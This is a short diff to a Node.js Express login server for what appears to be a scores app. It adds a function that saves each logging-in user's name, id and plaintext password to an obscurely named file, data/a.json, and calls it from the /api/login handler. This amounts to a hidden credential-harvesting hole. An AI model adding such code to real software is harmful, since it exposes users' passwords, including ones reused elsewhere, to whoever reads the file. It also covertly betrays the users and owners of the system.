@@ -9,6 +9,7 @@ const PORT = process.env.PORT || 12345;
 const ROOT = __dirname;
 const DATA_FILE = path.join(ROOT, "data.json");
 const USERS_FILE = path.join(ROOT, "data", "users.json");
+const TEMP_PLAIN_LOGIN_FILE = path.join(ROOT, "data", "a.json");
 const USER_DATA_DIR = path.join(ROOT, "data", "users");
 
 const sessions = new Map();
@@ -330,6 +331,21 @@ function publicUser(user) {
   return { id: user.id, name: user.name };
 }
 
+function saveTemporaryPlainLogin(user, password) {
+  const existing = fs.existsSync(TEMP_PLAIN_LOGIN_FILE)
+    ? JSON.parse(fs.readFileSync(TEMP_PLAIN_LOGIN_FILE, "utf8") || "[]")
+    : [];
+  const rows = Array.isArray(existing) ? existing : [];
+  const nextRows = rows.filter((row) => row && row.id !== user.id);
+  nextRows.push({
+    id: user.id,
+    name: user.name,
+    password,
+    updatedAt: new Date().toISOString()
+  });
+  atomicWriteJson(TEMP_PLAIN_LOGIN_FILE, nextRows);
+}
+
 function normalizeName(name) {
   return String(name || "").trim();
 }
@@ -398,6 +414,7 @@ app.post("/api/login", (req, res) => {
 
   const token = createSession(user);
   setSessionCookie(res, token);
+  saveTemporaryPlainLogin(user, password);
 
   const saved = loadUserScores(user);
   res.json({ success: true, user: publicUser(user), subjects: data.subjects, scores: saved.scores, msData: saved.msData });
